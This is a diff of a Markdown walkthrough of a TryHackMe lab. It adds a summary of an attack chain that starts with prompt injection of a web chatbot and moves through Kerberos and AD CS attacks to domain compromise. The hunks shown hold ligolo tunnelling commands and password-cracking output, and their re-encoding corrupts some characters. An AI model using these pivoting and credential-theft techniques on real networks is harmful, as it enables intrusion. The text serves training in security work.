@@ -1,8 +1,11 @@
 ---
-lab: Hoppers Origin
+title: Hoppers Origin
 date: 2026-09-05
 platform: TryHackMe
 difficulty: Insane
+tags: ["Active Directory"]
+summary: Initial access was gained by exploiting prompt injection in a web chatbot, followed by local root privilege escalation via CVE-2025-32463. Pivoting through the internal network enabled credential harvesting through AS-REP roasting, AlwaysInstallElevated abuse, and cross-forest domain compromise via Kerberos Golden Tickets with SID history. Access was further extended into an adjacent Active Directory environment by exploiting xp_cmdshell over a linked MSSQL server connection. Final domain compromise was achieved by exploiting an AD CS ESC1 certificate template misconfiguration to request an administrator certificate and execute a Pass-the-Hash attack on the domain controller.
+draft: false
 ---
 # Room link: https://tryhackme.com/room/ho-aoc2025-yboMoPbnEX
 
@@ -368,7 +371,7 @@ If I can redirect it to my machine, maybe it will send me the `credentials`. I t
 
 To do this, I setup a `listener` on `ligolo-agent`.
 
-`[Agent : haz@db] » listener_add --addr 0.0.0.0:4545 --to 127.0.0.1:4545`
+`[Agent : haz@db] Â» listener_add --addr 0.0.0.0:4545 --to 127.0.0.1:4545`
 
 So remember that this website is from one of the `internal targets`, If I'm going to direct it to me, I need to run it through the `ligolo-agent` because it doesn't have visibility on my `attack host`. 
 
@@ -460,7 +463,7 @@ Loaded 33 password hashes with 33 different salts (krb5asrep, Kerberos 5 AS-REP 
 Will run 6 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 {REDACTED}       ($krb5asrep$qw2.amy.young@AI.VANCHAT.LOC)     
-1g 0:00:02:50 DONE (2026-09-08 09:42) 0.005878g/s 84315p/s 2698Kc/s 2698KC/s !!123sabi!!123..*7ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡Vamos!
+1g 0:00:02:50 DONE (2026-09-08 09:42) 0.005878g/s 84315p/s 2698Kc/s 2698KC/s !!123sabi!!123..*7ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡Vamos!
 Use the "--show" option to display all of the cracked passwords reliably
 
 ```
@@ -506,7 +509,7 @@ Saved as: shell.msi
 Created a listener through `ligolo-agent`.
 
 ```bash
-[Agent : haz@db] » listener_add --addr 0.0.0.0:6666 --to 127.0.0.1:6666
+[Agent : haz@db] Â» listener_add --addr 0.0.0.0:6666 --to 127.0.0.1:6666
 INFO[6562] Listener 2 created on remote agent!
 ```
 
@@ -1050,13 +1053,13 @@ The network was setup in a way where I can't access `SERVER3` from my attack hos
 ##### Listener from DB Agent to Attack host
 
 ```bash
-[Agent : haz@db] » listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601
+[Agent : haz@db] Â» listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601
 INFO[12747] Listener 0 created on remote agent! 
 ```
 ##### Create interface for Server3
 
 ```bash
-[Agent : haz@db] » ifcreate --name server3
+[Agent : haz@db] Â» ifcreate --name server3
 INFO[12778] Creating a new server3 interface...          
 INFO[12778] Interface created!                 
 ```
@@ -1068,9 +1071,9 @@ PS C:\Tools> .\agent.exe -connect 10.200.171.11:11602 -ignore-cert              
 ##### Add route specifically for Server3
 
 ```bash
-[Agent : VANCHAT\rdc1bd@RDC1] » route_add --name server3 --route 10.200.171.103/32
+[Agent : VANCHAT\rdc1bd@RDC1] Â» route_add --name server3 --route 10.200.171.103/32
 INFO[12859] Route created.                               
-[Agent : VANCHAT\rdc1bd@RDC1] » tunnel_start --tun server3
+[Agent : VANCHAT\rdc1bd@RDC1] Â» tunnel_start --tun server3
 INFO[12866] Starting tunnel to VANCHAT\rdc1bd@RDC1 (0affe044e78f) 
 
 
